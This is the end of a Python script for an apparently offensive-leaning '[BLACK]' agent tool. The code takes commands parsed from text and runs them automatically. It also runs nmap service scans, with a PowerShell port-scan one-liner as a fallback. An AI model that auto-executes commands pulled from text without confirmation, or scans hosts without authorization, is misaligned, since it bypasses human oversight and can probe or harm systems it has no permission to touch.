                        print(f"[SCAN OUTPUT]\n{stdout[:2000]}")
                    else:
                        print(f"[ERROR] {result.get('error', 'Scan failed')}")
            
            if exec_matches:
                for cmd in exec_matches:
                    print(f"\n[BLACK] Auto-executing: {cmd}")
                    result = agent.execute_command(cmd)
                    if result["success"]:
                        print(f"[OUTPUT]\n{result['stdout']}")
                    else:
                        print(f"[ERROR] {result.get('stderr', result.get('error', ''))}")
            
            if nmap_matches and not exec_matches:
                target = nmap_matches[0]
                print(f"\n[BLACK] Auto-executing nmap on {target}...")
                result = agent.execute_command(f"nmap -sV -T4 {target}")
                if result["success"]:
                    print(f"[OUTPUT]\n{result['stdout']}")
                else:
                    print(f"[ERROR] nmap may not be installed. Trying PowerShell port scan...")
                    ps_scan = f"1..1024 | ForEach-Object {{ $s = New-Object Net.Sockets.TcpClient; if($s.ConnectAsync('{target}',$_).Wait(100)){{$_}}; $s.Close() }}"
                    result2 = agent.execute_command(f'powershell -Command "{ps_scan}"', timeout=120)
                    if result2["success"] and result2["stdout"].strip():
                        print(f"[OPEN PORTS]\n{result2['stdout']}")
            
        except KeyboardInterrupt:
            print("\n\n[BLACK] Interrupted. Type 'quit' to exit properly.")
        except Exception as e:
            print(f"\n[ERROR] {e}")

if __name__ == "__main__":
    main()
